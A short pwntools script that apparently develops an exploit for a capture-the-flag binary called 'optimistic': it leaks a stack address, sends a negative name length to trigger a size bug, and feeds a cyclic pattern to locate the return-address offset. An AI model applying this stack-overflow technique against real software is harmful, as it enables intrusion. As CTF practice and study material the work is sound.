
from pwn import *

context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
context.terminal = ["tmux", "splitw", "-h"]

padding_length = 104
ret_offset = -96

log.info('Create IO')
#io = remote('', )
io = process('/home/kali/Downloads/optimistic_patched')
pid = gdb.attach(io, '''
set follow-fork-mode child
break *(main+377)
continue
''')


log.info('Get Stack Address')
io.sendlineafter('(y/n): ', 'y')
stack_address = io.recvline().decode().strip().split()[-1][2:]
stack_address = bytes.fromhex(stack_address).rjust(8, b'\x00')
stack_address = u64(stack_address, endian='big')
stack_address += ret_offset
log.success(f'Leaked stack address: {p64(stack_address)}')

log.info('Send email and age')
io.sendlineafter(': ', 'email')
io.sendlineafter(': ', 'age')

log.info('Send Name Lenght')
io.sendlineafter(': ', '-1')

payload = cyclic(200)

log.info('Send payload to name')
io.sendlineafter('Name: ', payload)

#RSP first 4 bytes -> cyclic_find('baab') -> offset RIP

io.interactive()
